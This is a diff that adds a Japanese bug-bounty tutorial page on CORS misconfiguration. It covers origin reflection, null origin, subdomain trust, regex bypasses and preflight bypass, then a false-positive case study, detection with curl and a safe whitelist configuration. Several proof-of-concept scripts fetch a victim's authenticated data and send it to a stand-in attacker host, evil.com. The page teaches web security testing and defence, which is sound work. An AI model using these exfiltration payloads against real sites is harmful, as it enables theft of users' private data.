@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; CORS Misconfiguration
+        </div>
+
+        <div class="page-header">
+            <h1>CORS Misconfiguration</h1>
+            <p class="subtitle">
+                Cross-Origin Resource Sharing の設定ミスにより、攻撃者のサイトから被害者の
+                認証済みデータを読み取る。ただし「exploitable な CORS misconfig」の判断が重要。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-handson">Hands-on</span>
+                <span class="tag tag-casestudy">Case Study</span>
+            </div>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>原理と仕組み</h2>
+            <p>
+                Same-Origin Policy (SOP) は、異なるオリジンのリソースへのアクセスを制限する。
+                CORS はこの制限を緩和する仕組みだが、設定ミスにより意図しないオリジンからの
+                アクセスを許可してしまうことがある。
+            </p>
+<pre><code>// CORS の基本動作
+// 1. ブラウザが Origin ヘッダー付きでリクエスト送信
+GET /api/user HTTP/1.1
+Origin: https://evil.com
+
+// 2. サーバーが Access-Control-Allow-Origin で許可オリジンを返す
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.com  ← 問題!
+Access-Control-Allow-Credentials: true
+
+// 3. ブラウザが「許可されたオリジン」と判断し、レスポンスを JavaScript に渡す</code></pre>
+
+            <div class="callout danger">
+                <div class="callout-title">CORS misconfig が exploitable な条件</div>
+                <p>以下の <strong>全て</strong> が揃う必要がある:</p>
+                <ol>
+                    <li>Access-Control-Allow-Origin が攻撃者のオリジンを反映する</li>
+                    <li>Access-Control-Allow-Credentials: true が設定されている</li>
+                    <li><strong>認証が Cookie ベース</strong> (SameSite=None でないと Cookie が送信されない)</li>
+                    <li>レスポンスに機密データが含まれる</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- 種類 -->
+        <div class="section">
+            <h2>種類と分類</h2>
+
+            <h3>1. Origin Reflection (最も危険)</h3>
+            <p>
+                リクエストの Origin ヘッダーをそのまま Access-Control-Allow-Origin に反射する。
+            </p>
+<pre><code>// リクエスト
+GET /api/account HTTP/1.1
+Origin: https://evil.com
+Cookie: session=abc123
+
+// レスポンス
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.com  ← 入力がそのまま反射
+Access-Control-Allow-Credentials: true
+{"email": "victim@target.com", "balance": 50000}
+
+// 攻撃者のサイトに設置する PoC
+&lt;script&gt;
+fetch('https://target.com/api/account', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => {
+    // 被害者のデータを攻撃者のサーバーに送信
+    fetch('https://evil.com/collect', {
+      method: 'POST',
+      body: JSON.stringify(data)
+    });
+  });
+&lt;/script&gt;</code></pre>
+
+            <h3>2. Null Origin</h3>
+            <p>
+                <code>Origin: null</code> が許可されている場合。
+                iframe の sandbox 属性や data: URI から null origin を送信可能。
+            </p>
+<pre><code>// サーバーが null を許可
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+// 攻撃: sandboxed iframe から null origin を送信
+&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+        srcdoc="
+&lt;script&gt;
+fetch('https://target.com/api/account', {credentials: 'include'})
+  .then(r => r.text())
+  .then(d => location='https://evil.com/collect?data='+btoa(d));
+&lt;/script&gt;"&gt;
+&lt;/iframe&gt;</code></pre>
+
+            <h3>3. Subdomain Trust</h3>
+            <p>
+                *.target.com を信頼する設定。サブドメインに XSS があれば CORS bypass 可能。
+            </p>
+<pre><code>// サーバーの検証ロジック:
+if (origin.endsWith('.target.com')) {
+    headers['Access-Control-Allow-Origin'] = origin;
+}
+
+// 攻撃: XSS がある sub.target.com 経由
+// sub.target.com での XSS payload:
+fetch('https://api.target.com/sensitive', {credentials:'include'})
+  .then(r => r.text())
+  .then(d => fetch('https://evil.com/collect?d='+btoa(d)))</code></pre>
+
+            <h3>4. Regex Bypass</h3>
+<pre><code>// 不十分な正規表現による検証
+// 意図: *.target.com のみ許可
+// 実装: /target\.com$/
+
+// バイパス:
+Origin: https://evil-target.com         // endsWith bypass
+Origin: https://target.com.evil.com     // subdomain trick
+Origin: https://nottarget.com           // prefix missing
+
+// 別の不十分なパターン
+// 意図: https://target.com のみ
+// 実装: /^https:\/\/.*target\.com/
+Origin: https://evil.com?.target.com    // ? as path separator
+Origin: https://evil.com#.target.com    // fragment</code></pre>
+
+            <h3>5. Pre-flight Bypass</h3>
+<pre><code>// Simple Request (preflight なし) の条件:
+// - GET, HEAD, POST のみ
+// - Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded
+// - カスタムヘッダーなし
+
+// JSON API への CORS 攻撃:
+// Content-Type: application/json は preflight が発生する
+// → text/plain で送信して Content-Type 検証をバイパス
+fetch('https://target.com/api/data', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'text/plain'},
+    body: JSON.stringify({action: 'delete'})
+});</code></pre>
+        </div>
+
+        <!-- Exploitable かどうかの判断 -->
+        <div class="section">
+            <h2>Exploitable vs Not Exploitable</h2>
+
+            <div class="callout success">
+                <div class="callout-title">Exploitable (報告価値あり)</div>
+                <ul>
+                    <li>Origin reflection + Credentials: true + Cookie-based auth + 機密データ in response</li>
+                    <li>Null origin allowed + Credentials: true + 機密データ</li>
+                    <li>Subdomain trust + subdomain に XSS あり</li>
+                </ul>
+            </div>
+
+            <div class="callout danger">
+                <div class="callout-title">NOT Exploitable (報告価値なし - False Positive)</div>
+                <ul>
+                    <li><strong>Bearer Token (Authorization ヘッダー) のみの認証</strong>: CORS はブラウザの Cookie 自動送信を悪用するもの。Authorization ヘッダーは攻撃者のサイトから付与できない</li>
+                    <li><strong>Access-Control-Allow-Origin: * (ワイルドカード)</strong>: Credentials: true と同時に使用不可 (ブラウザが拒否)</li>
+                    <li><strong>レスポンスに機密データなし</strong>: public API で誰でも取得可能な情報</li>
+                    <li><strong>SameSite=Lax/Strict の Cookie</strong>: cross-origin では Cookie が送信されない</li>
+                    <li><strong>意図的な設計</strong>: embed/widget/OTT サービスで意図的に広いオリジンを許可</li>
+                </ul>
+            </div>
+
+            <h3>実体験: Tapple F1 False Positive</h3>
+            <div class="card">
+                <div class="card-title">CORS wide-open だが header-only auth = no bug</div>
+                <p>
+                    Tapple (マッチングアプリ) の API で CORS が広く開いているように見えたが、
+                    認証が <strong>Authorization ヘッダーのみ</strong> で Cookie を使用していなかった。
+                </p>
+                <p>
+                    CORS misconfiguration の PoC を書いても、攻撃者のサイトから Authorization ヘッダーを
+                    付与する方法がないため、<strong>実際には exploit 不可能</strong>。
+                </p>
+                <p class="annotation">
+                    教訓: CORS misconfig を見つけたら、まず認証メカニズムを確認する。
+                    Cookie auth でなければ CORS は security issue にならない。
+                </p>
+            </div>
+        </div>
+
+        <!-- 検出方法 -->
+        <div class="section">
+            <h2>検出方法</h2>
+<pre><code># 手動テスト
+curl -s -I -H "Origin: https://evil.com" https://target.com/api/user | grep -i "access-control"
+
+# 確認すべきレスポンスヘッダー
+Access-Control-Allow-Origin: https://evil.com  ← reflection?
+Access-Control-Allow-Credentials: true         ← credentials?
+
+# null origin テスト
+curl -s -I -H "Origin: null" https://target.com/api/user | grep -i "access-control"
+
+# サブドメインテスト
+curl -s -I -H "Origin: https://test.target.com" https://target.com/api/user
+
+# 次に確認: 認証メカニズムは何か?
+# Cookie (Set-Cookie with SameSite=None) → exploitable
+# Authorization header only → NOT exploitable</code></pre>
+
+            <h3>Exploit 可否チェックフロー</h3>
+            <table>
+                <thead>
+                    <tr><th>Step</th><th>確認事項</th><th>結果</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>1</td><td>Origin reflection あり?</td><td>No → Not vulnerable</td></tr>
+                    <tr><td>2</td><td>Credentials: true?</td><td>No → 機密データ読み取り不可</td></tr>
+                    <tr><td>3</td><td>Cookie-based auth?</td><td>No (header only) → <strong>Not exploitable</strong></td></tr>
+                    <tr><td>4</td><td>SameSite=None?</td><td>No (Lax/Strict) → Cookie 送信されない</td></tr>
+                    <tr><td>5</td><td>機密データ in response?</td><td>No → Impact なし</td></tr>
+                    <tr><td>6</td><td>全て Yes</td><td><strong>Exploitable!</strong></td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- 防御と Bypass -->
+        <div class="section">
+            <h2>防御と Bypass</h2>
+
+            <h3>安全な CORS 設定</h3>
+<pre><code>// 許可オリジンをハードコード (ホワイトリスト)
+const allowedOrigins = ['https://app.target.com', 'https://admin.target.com'];
+
+app.use((req, res, next) => {
+    const origin = req.headers.origin;
+    if (allowedOrigins.includes(origin)) {
+        res.setHeader('Access-Control-Allow-Origin', origin);
+        res.setHeader('Access-Control-Allow-Credentials', 'true');
+    }
+    next();
+});
+
+// または完全に無効化 (同一オリジンのみ)
+// Access-Control-Allow-Origin ヘッダーを返さない</code></pre>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice (WSA Labs)</h2>
+            <h3>PortSwigger Web Security Academy</h3>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack" target="_blank">Lab: CORS vulnerability with basic origin reflection</a></li>
+                <li><a href="https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack" target="_blank">Lab: CORS vulnerability with trusted null origin</a></li>
+                <li><a href="https://portswigger.net/web-security/cors/lab-breaking-https-attack" target="_blank">Lab: CORS vulnerability with trusted insecure protocols</a></li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>CORS misconfig = Cookie auth 前提</strong>: Authorization header only なら impact ゼロ</li>
+                    <li><strong>4条件を全確認</strong>: reflection + credentials + cookie auth + sensitive data</li>
+                    <li><strong>SameSite=Lax が追加防御</strong>: cross-origin で Cookie 送信されないなら exploitability なし</li>
+                    <li><strong>意図的設計を見極める</strong>: embed/widget/public API は CORS open が正常</li>
+                    <li><strong>Subdomain trust + XSS はチェーン価値</strong>: subdomain の XSS を探す価値がある</li>
+                    <li><strong>False positive に注意</strong>: CORS open = 即 vulnerability ではない</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- References -->
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/cors" target="_blank">PortSwigger - CORS</a></li>
+                <li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank">PortSwigger Research - Exploiting CORS for bounties</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/cors-bypass" target="_blank">HackTricks - CORS Bypass</a></li>
+                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank">MDN - Cross-Origin Resource Sharing</a></li>
+            </ul>
+        </div>
+
+        <!-- Complete Button -->
+        <div style="text-align:center; margin:2rem 0;">
+            <button class="complete-btn" data-module-id="1b-cors" onclick="toggleComplete('1b-cors')">Mark Complete</button>
+        </div>
+
+        <!-- Page Nav -->
+        <div class="page-nav">
+            <a href="1a-open-redirect.html">&larr; Prev: Open Redirect</a>
+            <a href="20-code-review-method.html">Next: Code Review Method &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
